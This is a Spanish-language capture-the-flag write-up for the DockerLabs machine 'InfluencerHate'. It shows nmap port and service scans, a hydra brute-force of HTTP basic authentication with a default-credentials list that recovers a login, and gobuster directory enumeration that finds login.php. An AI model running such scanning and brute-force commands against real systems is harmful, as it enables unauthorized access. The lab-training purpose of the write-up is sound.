# Maquina InfluencerHate (DockerLabs)
<img width="504" height="330" alt="Screenshot_6" src="https://github.com/user-attachments/assets/c6126784-18cc-4ef3-a8ae-cf05683624f2" />

## Fase de Reconociemiento
Con lo que empiezo siempre es con un escaneo de puertos rapidos con NMAP:

```bash
# nmap -p- -n -v -Pn 172.17.0.2 -oN scan-basic 
---
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Puedo observar que tanto el puerto 22 (SSH) y el puerto 80 (http) están abiertos. Lo siguiente que me propongo es obtener mas información de esos puertos, los servicios y versiones:

```bash
# nmap -p22,80 -sVC 172.17.0.2 -oN scan-full
---
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
|_  256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

- Puerto 22: OpenSSH 9.2p1 Debian 2+deb12u6
- Puerto 80: Apache httpd 2.4.62

Con esta información me doy cuenta que las versiones de los servicios son relativamente recientes.  
  
Me dispongo, entonces, a buscar información dentro de la **Pàgina WEB de Apache** que contiene el servidor. Lo primero que se observa al acceder a la pàgina es un login, y aquí decido hacer el primer ataque de fuerza bruta.

<img width="543" height="381" alt="Screenshot_3" src="https://github.com/user-attachments/assets/86f4f3d3-734b-4785-af3a-a745a0821004" />

## Fase de Explotación
Lo mas conveniente que veo es hacer el ataque con `hydra`, directamente con una lista de credenciales por defecto:
```bash
# hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt http-get://172.17.0.2
---
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
```
- El usuario es: **httpadmin**
- La contraseña es: **fhttpadmin**

Al acceder, lo unico que hay disponible es la pagina por defecto de Apache sin mucha información vulnerable, así que decido hacer una enumeración de directorios con `gobuster` indicando las credenciales antes obtenidas:
```bash
# gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,php,txt,log -U httpadmin -P fhttpadmin
---
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/login.php            (Status: 200) [Size: 2798]
/server-status        (Status: 403) [Size: 275]
===============================================================
```
